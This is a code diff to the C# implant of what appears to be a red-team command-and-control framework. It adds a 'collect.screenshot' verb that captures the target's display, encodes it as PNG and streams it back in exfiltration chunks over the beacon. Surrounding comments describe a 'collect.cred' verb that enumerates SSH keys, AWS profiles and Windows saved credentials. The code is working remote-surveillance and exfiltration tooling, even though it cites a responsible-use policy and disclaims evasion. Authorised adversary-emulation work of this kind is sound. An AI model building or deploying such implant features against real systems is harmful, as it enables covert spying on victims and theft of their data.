@@ -1,4 +1,5 @@
 using System.Diagnostics;
+using System.Globalization;
 using System.Runtime.Versioning;
 using System.Security.Cryptography;
 using Rod.V1;
@@ -10,14 +11,17 @@ namespace Rod.Implant.Internal;
 // Sec 10.1, ADR 0004). collect.cred enumerates standard credential stores on
 // the target -- SSH key fingerprints, the names of AWS profiles, the Windows
 // saved-credential listing -- and reports what it found without dumping secret
-// material. File reads moved to the core file verbs (file.pull / file.push in
+// material. collect.screenshot captures the display over the standard
+// desktop-capture APIs (ScreenCapture.cs) and streams it back as a PNG
+// artifact. File reads moved to the core file verbs (file.pull / file.push in
 // Files.cs): upload and download are operator file transfer, not collection.
 // LSASS memory dumping stays out-of-tree (ADR 0004); collect.keylog is
 // contract-only and not implemented here.
 //
 // Argument shape:
 //
-//   collect.cred  [<source>]   source in {ssh, aws, cmdkey} (optional)
+//   collect.cred        [<source>]   source in {ssh, aws, cmdkey} (optional)
+//   collect.screenshot  (no arguments)
 //
 // As with the other reference handlers, this performs no evasion, no
 // obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
@@ -58,6 +62,53 @@ internal static class Collect
         return lines.Count == 0
             ? (TaskOutcome.Succeeded, "(no credentials found)", Array.Empty<ExfilChunk>())
             : (TaskOutcome.Succeeded, string.Join("\n", lines), Array.Empty<ExfilChunk>());
+    }
+
+    // The size of each ExfilChunk data payload for a streamed screenshot,
+    // matching the exfil and file-pull chunk sizes (512 KiB) so every
+    // artifact stream crosses the wire at the same ceiling.
+    private const int ChunkSize = 512 * 1024;
+
+    /// <summary>
+    /// Captures the target's display and returns it as a PNG artifact: the
+    /// frame is captured over the standard desktop-capture APIs (GDI on
+    /// Windows, X11 elsewhere), PNG-encoded in-process, and handed back as
+    /// ExfilChunk frames the beacon streams into the engagement artifact
+    /// store bound to this task (architecture.md Sec 10.1 collect, Sec 11).
+    /// The output is the manifest line; the PNG is the artifact, viewable
+    /// from the artifact listing and fetched by id. A host with no readable
+    /// display (a headless server) reports Failed with the cause.
+    /// </summary>
+    public static (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) Screenshot(string arguments)
+        => ScreenshotWithCapture(ScreenCapture.Capture);
+
+    // The same verb over an injected capture, so the tests drive the whole
+    // PNG-to-chunks pipeline without needing a live display.
+    internal static (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) ScreenshotWithCapture(
+        Func<CapturedScreen> capture)
+    {
+        CapturedScreen screen;
+        try
+        {
+            screen = capture();
+        }
+        catch (Exception ex)
+        {
+            return (TaskOutcome.Failed, "collect.screenshot: " + ex.Message, Array.Empty<ExfilChunk>());
+        }
+
+        if (screen.Width <= 0 || screen.Height <= 0 || screen.Rgba.Length != screen.Width * screen.Height * 4)
+            return (TaskOutcome.Failed, $"collect.screenshot: unusable frame {screen.Width}x{screen.Height}",
+                Array.Empty<ExfilChunk>());
+
+        var png = Png.EncodeRgba(screen.Width, screen.Height, screen.Rgba);
+        var name = "screenshot-"
+                   + DateTime.UtcNow.ToString("yyyyMMdd'T'HHmmss'Z'", CultureInfo.InvariantCulture)
+                   + ".png";
+        var chunks = Chunking.ChunkFile(name, "image/png", png, ChunkSize);
+        return (TaskOutcome.Succeeded,
+            $"captured {screen.Width}x{screen.Height} {name}: {png.Length} bytes, {chunks.Count} chunks",
+            chunks);
     }
 
     private static bool IsKnownCredSource(string s)
